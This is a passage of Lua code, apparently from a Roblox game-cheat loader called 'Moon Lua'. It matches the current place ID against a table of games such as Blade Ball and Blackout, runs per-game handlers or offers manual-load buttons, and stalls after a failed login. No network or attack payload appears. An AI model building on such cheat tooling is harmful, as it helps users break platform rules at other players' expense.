						["Ultimate Battlegrounds"] = { 11815767793, 101993432229107 },
						Wanted = 14438406081,
						Blackout = { 18243214051, 15432890326, 137064773215574 },
						Defusal = 79393329652220,
						["Block Spin"] = { 97556409405464 },
						Gakuran = 128736949265057,
						["Blade Ball"] = 4777817887,
					}

					for k, v10 in pairs(tbl9) do
						if typeof(v10) == "table" then
							for _, v11 in ipairs(v10) do
								if placeId == v11 then
									handlers[k]()
									flag = true
									break
								end
							end
						elseif placeId == v10 then
							handlers[k]()
							flag = true
						end

						if not flag then
							continue
						end
						break
					end

					if not flag then
						local manualLoad = settings:CreateModule({
							Id = "autoload-manual-load",
							Name = "Manual Load",
							NameKey = "Settings.ManualLoad.Module",
						})

						for k in pairs(tbl9) do
							manualLoad:CreateButton({
								Id = "manual-load-" .. k,
								Name = k,
								NameKey = "manual-load-" .. k,
								Callback = function()
									handlers[k]()
									flag = true
								end,
							})
						end
					end

					fn7({ Title = "Moon Lua", Text = "Loaded", Duration = 5 })

					if autoloadcfg then
						loadcfg(autoloadcfg)
					end

					return
				end

				while true do
					Wait()
				end
			else
				fn6("Login Failed2", result3)

				while true do
					Wait()
				end
			end
		end
	end
end
